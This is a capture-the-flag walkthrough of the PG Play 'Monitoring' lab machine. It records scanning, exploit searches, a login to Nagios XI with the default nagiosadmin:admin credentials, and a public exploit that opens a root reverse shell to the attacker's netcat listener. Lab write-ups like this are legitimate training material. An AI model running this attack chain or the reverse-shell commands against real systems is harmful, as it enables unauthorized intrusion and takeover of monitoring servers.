[<- home](/)

# Monitoring --- PG Play
## [_Manual Exploitation_]
### Enumeration
First I assigned a value to `targ3t` variable in bash and passed it the IP address of the machine to make it easier to operate:
```
targ3t=192.168.247.148
```
Then I did an aggressive scan on the target using `nmap`:
```
nmap -A $targ3t -oN nmap.scan -vv
```
### Port 80
I got curious about port `80` where we have a site `Nagios XI` and a button indicating access to Nagios XI. Once we press it, a login form opens up. So I decided to put it through `dirsearch` and `feroxbuster` scans simultaneously like so:
```
dirsearch -u http://$targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o ferox.scan
```
Both yielded interesting results, but more so `feroxbuster` as we have a couple of paths with status code `200`. Upon checking them it doesn't seem to me like they give away any vital information. I went back to the nmap scan results and it shows an ldap port open also, which is running OpenLDAP 2.2.x - 2.3.X. Let's try and see if there are any exploits for it:

### LDAP
```
searchsploit OpenLDAP
```
Looks like all of these are DoS exploits, which we don't need. Let's see if searchsploit has anything for Postfix smtp:

### SMTP
```
searchsploit Postfix
```
There is a number of results, but I like the one that is a python script better:
```
cp $(locate 34896.py) .
```
Let's see how it works:
```
head 34896.py
```
Apparently we just need to indicate a target and an SMTP command:
```
python2 34896.py $targ3t "NOOP"
```
After trying this and other commands, I couldn't get any results whatsoever, so I decided to temporarily go back to the web interface on this machine. I searched Nagios XI in searchsploit and received a number of results for different versions:

### Back to Port 80
```
searchsploit Nagios XI
```
So I became interested if I can get a version on it on port 80 anywhere. Like before, no page has any information about the version of this framework. So I went ahead and used the first python exploit in the results:
```
cp $(locate 44560.py) .
python2 44560.py
```
The usage seems to be dependent on the listener. Let's launch a netcat listener first:
```
nc -lvnp 2298
```
Now let's run the exploit on the target:
```
python2 44560.py -r $targ3t -l 192.168.45.228 -p 2298
```
Seems like the code is broken. After looking into it I saw that it isn't detrimental to the way exploit operates, so I commented it and references to it out. After that the exploit received a 404 Response. So, moving on.

I searched around for Nagios XI docs and found that a default admin username/password pair is nagiosadmin:admin. Filled it in in our login page and it worked. After logging in, we can clearly see that the version of this Nagios XI is `5.6.0`. Let's search the web to exploit it. I quickly found [this exploit](https://github.com/hadrian3689/nagiosxi_5.6.6) on github, let's try it:

### Exploitation
```
wget https://raw.githubusercontent.com/hadrian3689/nagiosxi_5.6.6/refs/heads/main/exploit.py
chmod 777 exploit.py
```
Let's see how it works:
```
python exploit.py -h
```
Let's try it:
```
python3 exploit.py -t http://$targ3t -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.228 -lp 2298
```
And we have a root shell! Let's grab a flag:
```
cat /root/proof.txt
```
Nice!

## [_Metasploit Exploitation_]
